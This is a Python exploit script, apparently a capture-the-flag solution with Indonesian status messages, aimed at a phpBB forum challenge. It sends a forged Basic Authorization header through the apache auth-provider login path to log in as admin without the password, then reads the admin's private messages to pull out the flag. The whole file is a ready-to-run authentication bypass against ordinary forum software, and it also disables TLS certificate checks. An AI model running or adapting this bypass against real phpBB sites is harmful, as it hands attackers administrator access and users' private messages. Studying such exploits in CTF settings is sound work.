#!/usr/bin/env python3

import os
import re
import socket
import sys
from html import unescape
from urllib.parse import urlparse, urlunparse

import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FLAG_RE = re.compile(r"(?:NNS|CTF|FLAG)\{.*?\}")
PM_LINK_RE = re.compile(r'ucp\.php\?i=pm&amp;mode=view&amp;f=0&amp;p=(\d+)')
DEFAULT_TARGET = "https://php-is-my-passion-d0086d43aa6e.chall.nnsc.tf"


def resolve_ips(hostname: str) -> list[str]:
    seen = []
    for family, _, _, _, sockaddr in socket.getaddrinfo(hostname, None, type=socket.SOCK_STREAM):
        if family != socket.AF_INET:
            continue
        ip = sockaddr[0]
        if ip not in seen:
            seen.append(ip)
    return seen


def base_for_ip(parsed_target, ip: str) -> str:
    netloc = ip
    if parsed_target.port:
        netloc = f"{ip}:{parsed_target.port}"
    return urlunparse((parsed_target.scheme, netloc, "", "", "", "")).rstrip("/")


def get(session: requests.Session, base: str, host: str, path: str, **kwargs) -> requests.Response:
    headers = {"Host": host}
    headers.update(kwargs.pop("headers", {}))
    return session.get(
        f"{base}{path}",
        headers=headers,
        verify=False,
        timeout=10,
        **kwargs,
    )


def post(session: requests.Session, base: str, host: str, path: str, **kwargs) -> requests.Response:
    headers = {"Host": host}
    headers.update(kwargs.pop("headers", {}))
    return session.post(
        f"{base}{path}",
        headers=headers,
        verify=False,
        timeout=10,
        allow_redirects=False,
        **kwargs,
    )


def try_backend(parsed_target, ip: str) -> str | None:
    host = parsed_target.hostname
    assert host is not None
    base = base_for_ip(parsed_target, ip)
    session = requests.Session()

    login_resp = post(
        session,
        base,
        host,
        "/ucp.php?mode=login_link&auth_provider=apache&login_link_aikido=1",
        headers={
            "Host": host,
            "Authorization": "Basic YWRtaW46eA==",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        data={
            "login_username": "admin",
            "login_password": "x",
            "login": "Login",
        },
    )
    if login_resp.status_code != 302:
        return None
    set_cookie = login_resp.headers.get("Set-Cookie", "")
    if "phpbb3_" not in set_cookie:
        return None

    inbox_resp = get(session, base, host, "/ucp.php?i=pm&folder=inbox")
    if "Please login in order to access the User Control Panel." in inbox_resp.text:
        return None

    match = PM_LINK_RE.search(inbox_resp.text)
    if not match:
        return None

    msg_id = match.group(1)
    pm_resp = get(session, base, host, f"/ucp.php?i=pm&mode=view&f=0&p={msg_id}")
    flag = FLAG_RE.search(unescape(pm_resp.text))
    return flag.group(0) if flag else None


def main() -> int:
    target = os.environ.get("TARGET", DEFAULT_TARGET).rstrip("/")
    if len(sys.argv) > 1:
        target = sys.argv[1].rstrip("/")

    parsed = urlparse(target)
    if not parsed.scheme or not parsed.hostname:
        print(f"[!] TARGET tidak valid: {target}", file=sys.stderr)
        return 1

    ips = resolve_ips(parsed.hostname)
    if not ips:
        print(f"[!] Gagal resolve host: {parsed.hostname}", file=sys.stderr)
        return 1

    print(f"[*] Target: {target}")
    print(f"[*] Backend candidates: {', '.join(ips)}")

    for ip in ips:
        print(f"[*] Coba backend {ip}")
        try:
            flag = try_backend(parsed, ip)
        except requests.RequestException as exc:
            print(f"[!] Request error di {ip}: {exc}")
            continue
        if flag:
            print(f"[+] Flag ketemu dari backend {ip}")
            print(f"<FLAG>{flag}</FLAG>")
            return 0

    print("[!] Exploit gagal di semua backend", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
